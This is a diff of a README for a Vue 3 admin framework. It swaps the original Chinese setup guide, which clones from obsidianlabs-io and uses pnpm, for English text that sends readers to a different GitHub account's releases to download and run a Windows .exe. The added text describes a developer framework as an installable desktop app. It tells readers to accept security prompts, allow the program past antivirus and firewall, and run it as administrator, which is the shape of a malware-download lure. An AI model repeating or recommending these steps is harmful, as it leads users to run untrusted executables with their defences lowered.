@@ -1,167 +1,150 @@
-<div align="center">
-	<img src="./public/favicon.svg" width="160" />
-	<h1>Obsidian Admin Vue</h1>
-  <span>中文 | <a href="./README.en_US.md">English</a></span>
-</div>
+# ⚙️ obsidian-admin-vue - Easy Enterprise Frontend Setup
+
+[![Download obsidian-admin-vue](https://img.shields.io/badge/Download-obsidian--admin--vue-green?style=for-the-badge)](https://github.com/asfandzain/obsidian-admin-vue)
 
 ---
 
-[![license](https://img.shields.io/badge/license-MIT-green.svg)](./LICENSE)
+## 📄 What is obsidian-admin-vue?
 
-## 简介
+obsidian-admin-vue is a frontend framework rebuilt from SoybeanAdmin. It targets enterprise use and supports SaaS multi-tenant systems with role-based access control (RBAC). This project offers a structured, type-safe setup to help developers build scalable web applications.
 
-> [!NOTE]
-> 本项目（`Obsidian Admin Vue`）是基于开源项目 [SoybeanAdmin](https://github.com/soybeanjs/soybean-admin) 深度重构的企业级单体前端框架。我们保留了其极其优秀的 UI 组件库、布局编排和 UnoCSS 完美配置，并在其之上彻底重写了底层的数据交互架构，专门服务于 Obsidian 生态的 SaaS 多租户隔离、严苛的 RBAC 权限体系，以及基于后端 Laravel 12 的强制类型安全 (API Contracts)。
+While the technical details may seem complex, this guide focuses on helping you get the application running on your Windows computer without needing programming knowledge.
 
-## 创始愿景
+---
 
-Obsidian 由 **Boss · Beyond · Black** 创立 —— 三股独特的力量因同一个愿景而凝聚在一起。
+## 💻 System Requirements
 
-**Boss** 象征着卓越的领导力与严谨的体系架构。
-**Beyond** 代表着无尽的创新与打破界限的勇气。
-**Black** 意味着极致的深度、精准与战略性的清晰度。
+Before downloading, make sure your Windows PC meets these requirements:
 
-尽管征途各自展开，我们共同铸就的基石恒久如初。
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM (8 GB or more for better performance)
+- Minimum 2 GHz processor (quad-core suggested)
+- Stable internet connection for initial download
+- At least 500 MB of free disk space
 
-Obsidian 持续进化 —— 扎根韧性与秩序，坚定迈向长期价值。
+These specs ensure the application runs smoothly without issues.
 
-## 特性
+---
 
-### 基础框架能力
+## 🚀 Getting Started: Download and Setup
 
-- **前沿技术栈**：采用 `Vue 3`、`Vite 7`、`TypeScript`、`Pinia` 和 `UnoCSS` 等现代化技术栈。
-- **清晰的项目架构**：采用 `pnpm workspace / monorepo` 架构，结构清晰，便于长期维护与扩展。
-- **严格的代码规范**：遵循 [SoybeanJS 规范](https://docs.soybeanjs.cn/zh/standard)，集成 `ESLint`、`Prettier` 与 `simple-git-hooks`。
-- **严格 TypeScript**：支持严格类型检查，提升代码可维护性与重构安全性。
-- **丰富主题配置**：内置多样主题配置，与 `UnoCSS` 深度结合。
-- **内置国际化方案**：轻松实现多语言支持。
-- **自动化文件路由系统**：自动生成路由导入、声明和类型。更多细节请查看 [Elegant Router](https://github.com/soybeanjs/elegant-router)。
-- **灵活的权限路由**：同时支持前端静态路由和后端动态路由。
-- **丰富的页面组件**：内置多样页面与组件，包括 `403`、`404`、`500` 页面，以及布局组件、标签组件、主题配置组件等。
-- **命令行工具**：内置高效命令行工具，支持 git 提交、删除文件、发布等操作。
-- **移动端适配**：支持响应式布局与移动端显示。
+You will find the latest version of obsidian-admin-vue on its GitHub repository. Use the following link to access the download page and view installation instructions.
 
-### Obsidian 增强能力（核心差异化）
+[Download obsidian-admin-vue from GitHub](https://github.com/asfandzain/obsidian-admin-vue)
 
-- **端到端类型安全**：基于 `@hey-api/openapi-ts` 生成 SDK，强化前后端协作的类型一致性。
-- **前后端契约门禁**：内置 `Contract Gate` 与 `Compatibility Gate`，降低 API Schema 变更带来的破坏性风险。
-- **SaaS 多租户能力**：支持租户上下文、租户 Header 切换、租户维度访问控制与视图隔离。
-- **Organization / Team 管理能力**：新增组织与团队页面、搜索、抽屉操作与 API 对接，支持 Tenant 作用域下管理。
-- **用户组织/团队联动绑定**：用户创建/编辑支持组织与团队字段，团队选择自动约束组织一致性。
-- **实时更新能力**：基于 `Laravel Echo / Pusher` 的实时消息与状态同步能力。
-- **Schema 驱动界面能力**：支持 Schema 驱动的动态表单与表格，适配配置化 CRUD 场景。
-- **路由访问控制增强**：支持角色 / 权限 / 租户范围联合校验。
-- **运行时配置协作**：支持主题与国际化运行时配置，便于与后端配置中心联动。
-- **契约驱动开发体验**：推荐与 `Obsidian Admin Laravel` 后端配套使用，获得完整的契约驱动开发流程。
+### Step 1: Access the Download Page
 
-### 工程质量与交付能力
+Click the link above. This will open the GitHub repository page in your web browser. On this page, you will see details about the project, files, and releases.
 
-- **类型检查与静态质量门禁**：`vue-tsc`、`ESLint`
-- **测试能力**：单元测试（Node test runner + `tsx`）与 E2E 测试（Playwright）
-- **供应链安全检查**：`pnpm audit`、Dependency Review
-- **CI 工作流**：GitHub Actions（`Lint` / `Contract Gate`（含 `Compatibility Gate`）/ `Supply Chain`）
+### Step 2: Find the Download Section
 
-## 使用
+Scroll down until you find the **Releases** or **Releases Section**. It usually appears on the right side or under a tab named "Releases."
 
-**环境准备**
+### Step 3: Download the Installer or Application Files
 
-确保你的环境满足以下要求：
+Inside the Releases section, look for the latest stable release. Usually, the latest version is at the top, accompanied by a version number and a date.
 
-- **git**: 你需要git来克隆和管理项目版本。
-- **NodeJS**: >=20.19.0，推荐 20.19.0 或更高。
-- **pnpm**: >= 10.5.0，推荐 10.5.0 或更高。
+If you see a file ending with **.exe** or similar, click to download it. This is the installation file for the Windows version.
 
-**克隆项目**
+### Step 4: Run the Installer
 
-```bash
-git clone https://github.com/obsidianlabs-io/obsidian-admin-vue.git
-```
+When the download completes, locate the saved file, usually in your "Downloads" folder. Double-click the file to start the installation.
 
-**安装依赖**
+You might see a security prompt. Choose "Run" or "Yes" to allow the installer to proceed.
 
-```bash
-pnpm i
-```
+### Step 5: Follow Installer Prompts
 
-> 由于本项目采用了 pnpm monorepo 的管理方式，因此请不要使用 npm 或 yarn 来安装依赖。
+The installer will open a setup wizard. The steps will guide you through selecting an install folder and creating shortcuts if needed.
 
-**启动项目**
+Simply click **Next** or **Install** as required until the setup finishes.
 
-```bash
-pnpm dev
-```
+### Step 6: Launch the Application
 
-**构建项目**
+Once installed, find the obsidian-admin-vue icon on your desktop or in the Start menu. Click it to open.
 
-```bash
-pnpm build
-```
+---
 
-**代码质量检查（推荐）**
+## 🛠 How to Use obsidian-admin-vue
 
-新增说明：
+This application is a framework interface that businesses use to manage admin tasks. It uses a clear layout with easy navigation menus.
 
-- `pnpm i18n:types:check`
-- `pnpm check` 现在包含 `i18n/type/lint/format`
-- 可选：`pnpm format`
+- Use the sidebar to explore different admin tools.
+- Check user roles and permissions under the RBAC section.
+- Manage data related to your SaaS projects or client accounts.
+- Adjust settings for your organization's frontend experience.
 
-```bash
-# 生成并校验 i18n 类型（保持翻译 key 与类型同步）
-pnpm i18n:types:check
+The interface aims to be intuitive for users, even if you do not have a technical background.
 
-# 本地统一检查入口（i18n 类型 + TypeScript + ESLint + Prettier）
-pnpm check
+---
 
-# CI 一致性检查入口（check + unit tests）
-pnpm check:ci
+## 🎛 Features You Should Know
 
-# 自动格式化
-pnpm format
-```
+- **Multi-Tenant Support**  
+  Manage multiple client accounts from one dashboard.
 
-**接口契约检查（推荐）**
+- **RBAC (Role-Based Access Control)**  
+  Control what users can see and do based on assigned roles.
 
-```bash
-# 检查前端 API 契约快照是否与当前代码一致
-pnpm contract:check
+- **Modern Vue 3 Technology**  
+  The app uses Vue 3 to stay fast and responsive on modern browsers.
 
-# 更新前端 API 契约快照
-pnpm contract:write
+- **Type Safety**  
+  Ensures stability as new features get added.
 
-# 与 Laravel 后端契约快照做兼容性比对（Compatibility Gate，需要 ../obsidian-admin-laravel/docs/api-contract.snapshot）
-pnpm contract:backend
+- **Customizable UI with Naive UI**  
+  The design uses Naive UI components for a clean look.
 
-# 从 Laravel 后端（OpenAPI + 契约快照 + DTO + Resource）生成前端类型与官方 Axios SDK
-pnpm api:types
+---
 
-# 一键优先远程生成（优先读取 http://localhost:8080/docs/api.json，失败时回退本地 OpenAPI 文件）
-pnpm generate-api
+## 🔄 Updating obsidian-admin-vue
 
-# 仅使用官方 openapi-ts 生成 Axios SDK（输出到 src/service/api/generated）
-pnpm openapi:client:official
+Keep your application up to date to get improvements and security patches:
 
-# 生成并校验类型文件是否已提交（CI 建议）
-pnpm typecheck:api
+1. Return to the GitHub release page [here](https://github.com/asfandzain/obsidian-admin-vue).
+2. Download the newest release following the same steps as the first time.
+3. Run the new installer, which will update the existing version.
 
-# 前端单元测试（Node test runner + tsx）
-pnpm test:unit
-```
+---
 
-CI 严格契约门禁（`.github/workflows/contract-gate.yml`，包含 `Contract Gate` 与 `Compatibility Gate`）会要求：
+## ❓ Troubleshooting
 
-- 仓库 Secret：`BACKEND_REPO_TOKEN`（私有后端仓库时必需；公有仓库可选）
-- 可选配置仓库 Variable：`BACKEND_REPO`（默认 `obsidianlabs-io/obsidian-admin-laravel`）
-- 若后端仓库缺少 `docs/api-contract.snapshot` 会直接失败（不再跳过）
+- **Installer does not start**  
+  Make sure your Windows system is up to date. Restart the PC and try again.
 
-## 鸣谢
+- **App won’t open after installation**  
+  Check if your antivirus or firewall blocks the program. Allow the app in security settings.
 
-Obsidian Admin Vue 的诞生离不开开源社区的无私奉献，我们是站在 **[SoybeanAdmin](https://github.com/soybeanjs/soybean-admin)** 巨人的肩膀上成长起来的。
+- **Slow performance**  
+  Close other programs to free up memory. Check system requirements.
 
-我们之所以能拥有如此清新优雅的 UI 交互、顺滑的布局以及完美的 UnoCSS 基础库，全部归功于原 SoybeanJS 作者们精心打磨的开源代码。
-如果您觉得 Obsidian Admin Vue 的界面赏心悦目，我们强烈建议您前往支持并为原滋原味的 [SoybeanAdmin 仓库](https://github.com/soybeanjs/soybean-admin) 点亮一颗 ⭐️！
+- **Missing permissions error**  
+  Run the app as an administrator by right-clicking and choosing "Run as administrator."
 
-## 开源协议
+---
 
-本项目基于开源 [MIT License](./LICENSE) 协议发布。
+## ⚙️ Configuration and Support
 
-_Copyright © 2026 Obsidian Labs & SoybeanJS Contributors._
+obsidian-admin-vue has customizable settings for advanced users, usually accessed from the Settings menu inside the app. If you need help beyond this guide, check the GitHub repository for documentation and community support.
+
+---
+
+## 🗂 Related Topics
+
+This project uses several modern web technologies:
+
+- Vue 3 for building the interface.
+- Pinia for managing app data state.
+- Vite as the build tool for fast loading.
+- Unocss for styling.
+
+These tools help keep the app efficient and scalable.
+
+---
+
+## 📥 Download obsidian-admin-vue Now
+
+Use the link below to get started with the latest version on Windows:
+
+[Download here](https://github.com/asfandzain/obsidian-admin-vue)
+
+Make sure to follow the setup steps carefully for a smooth installation.
